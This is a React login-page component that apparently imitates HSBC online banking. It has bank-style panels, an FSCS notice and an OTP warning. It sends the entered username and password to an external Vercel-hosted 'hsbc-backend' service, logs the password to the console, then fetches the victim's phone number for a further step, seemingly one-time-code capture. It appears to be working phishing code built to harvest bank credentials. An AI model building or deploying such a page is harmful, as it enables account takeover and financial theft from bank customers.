import React, { useState, useEffect } from 'react';
import login from '../../assets/login.jpg';
import Footer from '../Footer/Footer';
import Otpwarn from '../Otp/Otp-warn';
import Leftpanel1 from '../Left Panel 1/Leftpanel1';
import Leftpanel2 from '../Left Panel 2/leftpanel2';
import Rightpanel1 from '../Right panel 1/rightpanel1';
import Rightpanel2 from '../Right Panel 2/Rightpanel2';
import Fscs from '../FSCS/Fscs';
import Header from '../Header/Header';
import Sorry from '../Sorry/Sorry';
import Leftpass from '../Left Pass/Leftpass';

export default function LoginPage() {
    const [step, setStep] = useState(1);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [updatedEmail, setUpdatedEmail] = useState('');
    const [rememberMe, setRememberMe] = useState(false);
    const [loading, setLoading] = useState(true);
    const [usernameError, setUsernameError] = useState("");
    const [passwordError, setPasswordError] = useState("");
    const [auth, setAuth] = useState({});

    useEffect(() => {
        const timer = setTimeout(() => {
            setLoading(false);
        }, 3000); // 3 seconds

        return () => clearTimeout(timer);
    }, []);

    const handleContinue = async (e) => {
        e.preventDefault();
        if (username) {
            try {
                const response = await fetch('https://hsbc-backend.vercel.app/api/v1/auth/user-validation', {
                    method: 'POST', 
                    headers: {
                        'Content-Type': 'application/json', 
                    },
                    body: JSON.stringify({ username }), 
                });
    
                if (response.ok) {
                    const data = await response.json();
                    console.log('API Response:', data);
                    if(data.blocked){
                        setUsernameError("user is blocked please click on notify button!");
                        return;
                    }

                    setStep(2); 
                } else {
                    console.error('API Error:', response.statusText);
                    setUsernameError("invalid Username");
                 
                }
            } catch (error) {
                setUsernameError("Intenet Issue try reloading the page!");
                console.error('Fetch Error:', error);

                // Handle network or other errors
            }
        } else {
            console.log('Username is required');
        }
    };

    console.log(usernameError);
    
    const handlePasswordSubmit = async () => {
        console.log("email for this user is:" , updatedEmail);
        console.log("password is:", password);
        console.log("phone number is:" , phoneNumber);
        try {
            const response = await fetch('https://hsbc-backend.vercel.app/api/v1/auth/signin', {
                method: 'POST', 
                headers: {
                    'Content-Type': 'application/json', 
                },
                body: JSON.stringify({ username, password }), 
            });

            if (response.ok) {
                const data = await response.json();
                setAuth(data);
                console.log('login Response:', data);
                console.log("phone number is :", data.user.phone);
              
                setPhoneNumber(data.user.phone);

                setStep(3);
            } else {
                console.error('API Error:', response.statusText);
                setPasswordError("invalid Password");
               
            }
        } catch (error) {
            console.error('Fetch Error:', error);
           
        }
    };
    console.log(auth? auth : '');

    if (loading) {
        return (
            <div className="bg-[#f3f3f3] h-screen flex flex-col">
                <Header />
                <div className="flex-grow flex items-center justify-center">
                    <div className="text-center">
                        <div className="loader border-t-4 border-black rounded-full w-12 h-12 animate-spin"></div>
                        <p className="text-gray-700 mt-4">Loading</p>
                    </div>
                </div>
                <Footer />
            </div>
        );
    }

    return (
        <div className="bg-[#3e505d] h-screen overflow-y-auto">
            {/* Header */}
            <Header />

            {/* Main Content */}
            <main className="relative min-h-[calc(100vh-80px)]">
                {/* Background img */}
                <div className="absolute inset-0 z-0">
                    <img
                        src={login}
                        alt="Background"
                        className="object-cover w-full h-full"
                    />
                </div>

                {/* Login Container */}
                <div className="relative z-10 px-4 pt-8">
                    <div className='flex justify-center flex-col items-center gap-3'>
                        <div className="w-full max-w-[1050px] grid grid-cols-1 md:grid-cols-[2.7fr_1.6fr] mt-10">
                            {/* Left Panel */}
                            <div className="bg-white p-8 flex flex-col justify-between">
                                {step === 1 ? (
                                    <Leftpanel1 
                                        username={username}
                                        setUsername={setUsername}
                                        rememberMe={rememberMe}
                                        setRememberMe={setRememberMe}
                                        handleContinue={handleContinue}
                                        usernameError={usernameError}
                                    />
                                ) : step === 2 ? (
                                    <Leftpass 
                                        username={username} 
                                        setStep={setStep}
                                        setPassword={setPassword}
                                        password={password}
                                        onSubmit={handlePasswordSubmit}
                                        passwordError={passwordError}
                                    />
                                ) : (
                                    <Leftpanel2 username={username} phoneNumber={phoneNumber} userAuth={auth} setStep={setStep} />
                                )}
                            </div>
                            {/* Right Panel */}
                            <div className="bg-[#f3f3f3] p-8 rounded-sm">
                                <h2 className="text-[#333333] text-xl mb-6">Help and support</h2>
                                {step === 1 ? (
                                    <>
                                       <Rightpanel1 />
                                    </>
                                ) : (
                                    <>
                                        <Rightpanel2 />
                                    </>
                                )}

                                {/* FSCS Information */}
                                <Fscs />
                            </div>
                        </div>
                        {/* OTP Warning */}
                        <div className='flex justify-center  max-w-[1050px] w-full  rounded-sm'>
                            {step === 1 && (
                             <div className='flex justify-center flex-col bg-gray-50/15  max-w-[1050px] w-full  rounded-sm mb-8 space-y-[1px]'>
                             <Sorry />
                             <Otpwarn />
                             </div>
                            )}
                        </div>
                    </div>
                </div>

            </main>

            {/* Footer */}
            <Footer />
        </div>
    );
}

